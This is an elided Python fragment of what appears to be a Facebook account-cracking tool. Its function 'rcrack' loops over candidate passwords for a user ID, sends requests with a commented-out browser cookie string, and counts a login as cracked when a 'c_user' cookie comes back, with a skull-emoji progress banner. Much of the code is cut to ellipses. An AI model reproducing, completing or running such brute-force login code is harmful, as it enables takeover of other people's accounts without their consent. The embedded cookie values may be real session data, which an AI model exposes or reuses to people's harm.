...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=nyjDZQG09EagaKzt3hDdnI2W; sb=nyjDZQAXAMX7kVUe5sn5M4hx; m_pixel_ratio=3; ps_l=0; ps_n=0; x-referer=%3D; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2404%3Btimestamp%3A1707289612; vpd=v1%3B661x360x3; dpr=3; wd=360x661; fr=0WuufhotgGBe1MLZK.AWXne4R3Gx5sC3UAscMTNuswJv0.Blwyif.eu.AAA.0.0.BlwyzS.AWWdlh2n_9g',
            'dpr': '3',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}M.DOT X💀🌪️{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
